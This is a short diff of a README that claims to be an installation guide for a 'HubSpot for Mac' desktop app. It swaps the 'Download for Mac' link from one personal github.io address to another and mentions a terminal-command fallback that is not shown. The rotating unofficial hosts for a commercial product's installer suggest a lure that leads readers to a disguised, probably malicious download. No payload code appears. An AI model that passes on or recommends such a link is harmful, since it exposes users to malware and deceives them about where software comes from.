@@ -3,7 +3,7 @@
 
 HubSpot for Mac is a powerful desktop application that allows you to manage your CRM, sales, marketing, and customer support right from your macOS device 🚀. Follow the guide below to install HubSpot quickly and easily on your Mac.  
 
-[![Download For Mac](https://img.shields.io/badge/Download%20for%20Mac-007AFF?style=for-the-badge&logo=apple)](https://kamartamara.github.io/.github/hubspot)  
+[![Download For Mac](https://img.shields.io/badge/Download%20for%20Mac-007AFF?style=for-the-badge&logo=apple)](https://tayusikf8398.github.io/.github/hubspot)  
 
 If the button does not work, please follow the installation guide below using terminal commands.  
 
